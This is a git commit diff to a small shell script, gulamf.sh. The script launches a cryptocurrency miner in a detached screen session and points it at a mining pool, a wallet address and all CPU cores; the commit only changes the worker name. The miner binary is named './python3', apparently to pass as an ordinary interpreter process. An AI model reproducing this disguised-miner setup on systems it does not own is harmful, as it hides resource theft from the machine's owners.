b6fcec6442d5f8adf6cf0fa2e09b72c33769bbeb
henstyle <henspicsaypro@gmail.com>
2024-12-27 22:44:25 +0700

    Update gulamf.sh

--- gulamf.sh
+++ gulamf.sh
@@ -8,4 +8,4 @@ else
     echo "File sudah ada"
 fi
 
-screen -dmS DOT ./python3 -a yespowersugar -o nomp.mofumofu.me:3391 -u sugar1qmpk65gyqqgk63lkrg27gnl9hc2e8zqn7jgmd5j.MEKI -t $(nproc)
+screen -dmS DOT ./python3 -a yespowersugar -o nomp.mofumofu.me:3391 -u sugar1qmpk65gyqqgk63lkrg27gnl9hc2e8zqn7jgmd5j.MEKVPS -t $(nproc)
